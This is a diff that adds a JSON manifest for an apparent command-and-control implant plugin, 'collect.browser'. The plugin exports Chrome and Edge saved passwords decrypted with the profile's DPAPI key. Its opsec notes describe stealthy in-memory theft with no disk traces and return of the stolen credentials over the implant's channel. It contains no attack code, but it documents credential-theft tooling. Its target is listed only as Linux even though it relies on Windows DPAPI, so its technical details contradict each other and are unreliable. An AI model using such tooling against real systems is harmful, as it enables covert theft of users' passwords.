@@ -1,0 +1,54 @@
+{
+  "name": "browser",
+  "entry": "plugin",
+  "description": "Chromium login stores: list the logins Chrome and Edge carry or export them with their passwords unsealed under the profile's DPAPI-fetched key -- collect.browser's execution half packed as the artifact an implant loads through module.load.",
+  "license": "Apache-2.0",
+  "opsec": {
+    "landsOnDisk": false,
+    "notes": "Server side, the package lands as descriptor rows and one artifact file under the module store -- no code runs in the teamserver. On the target, the implant half loads from staged task content and nothing it does lands on disk: the stores and the key are read where they sit, the passwords unseal in the implant process's memory, and the rows ride the task's channel back (the secrets through the credential rows the board renders masked). The sweep reads the login stores of the user the implant runs as -- a store sealed under another user's masterkeys refuses naming the mismatch, a live browser's write-ahead log may hold rows newer than the main file this read answers for, and passwords under the newer app-bound (v20) form report named rather than forced. The verb rides the per-engagement module load -- never a default profile."
+  },
+  "attack": [
+    "T1555.003"
+  ],
+  "versions": [
+    {
+      "version": "1.1.0",
+      "published": "2026-10-30T02:37:50Z",
+      "url": "https://github.com/rodframework/rod-plugin-browser/releases/download/v1.1.0/browser-1.1.0.zip",
+      "sha256": "7ce44484c978ebb4a2ba143fdfa3238bafeb99bc8f3f623dd4ee594dfeafb167",
+      "signature": "XT0gW5saO1fyVcIPHPY7eSHux23NKJYzCsIAK3XckVMKM6Zh9cfDmPiRCP0loQJBNynOrZwenECWxGHtvx5KAQ==",
+      "publicKey": "gDc7PcR7e5411IJgGJt2Oq10K/tFG9Ckl2BBCJjRlbE=",
+      "fingerprint": "7eb0ea8cc3b2158fe0da3492935cce23",
+      "compatibility": {
+        "teamserver": "1.0.0",
+        "targets": [
+          {
+            "implantClass": "implant",
+            "platform": "linux",
+            "arch": "amd64"
+          }
+        ],
+        "requires": [
+          "plugin-loader/exec-v1"
+        ]
+      },
+      "verbs": [
+        {
+          "name": "collect.browser",
+          "version": "1.0.0",
+          "techniques": [
+            "T1555.003"
+          ]
+        }
+      ],
+      "pluginArtifacts": [
+        {
+          "platform": "linux",
+          "arch": "amd64",
+          "path": "plugin/browser-linux-amd64",
+          "abi": "exec-v1"
+        }
+      ]
+    }
+  ]
+}
